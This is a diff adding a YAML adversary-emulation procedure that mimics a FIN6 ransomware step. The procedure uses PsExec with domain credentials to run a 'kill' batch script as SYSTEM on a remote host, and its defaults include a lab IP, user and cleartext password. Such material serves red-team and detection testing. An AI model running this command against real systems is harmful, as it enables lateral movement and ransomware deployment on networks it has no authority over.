@@ -1,0 +1,35 @@
+- id: 0c752dce-9302-4465-805f-522650aece3f
+  name: Execute Kill Scripts via PsExec
+  description: FIN6 has utilized PsExec to execute kill scripts on intended targets
+  tactic: execution
+  technique:
+    attack_id: T1569.002
+    name: 'System Services: Service Execution'
+  cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html
+  procedure_group: procedure_ransomware_execute_psexec
+  procedure_step: 7.3.3
+  platforms:
+    windows:
+      cmd:
+        command: |
+          start psexec.exe \\#{internal_IP} -u \#{domain_user} -p \#{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\#{batch_file}
+  input_arguments:
+    internal_IP:
+      description: Hostname or IP address
+      type: string
+      default: 172.18.39.6
+    domain_user:
+      description: Domain and username
+      type: string
+      default: ctid\pgustavo
+    password:
+      description: Valid Password
+      type: string
+      default: 'W1n1!2019'
+    batch_file:
+      description: windows.bat or kill.bat
+      type: string
+  executors:
+  - name: command_prompt
+    elevation_required: true
+    command: start psexec.exe \\#{internal_IP} -u \#{domain_user} -p \#{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\#{batch_file}
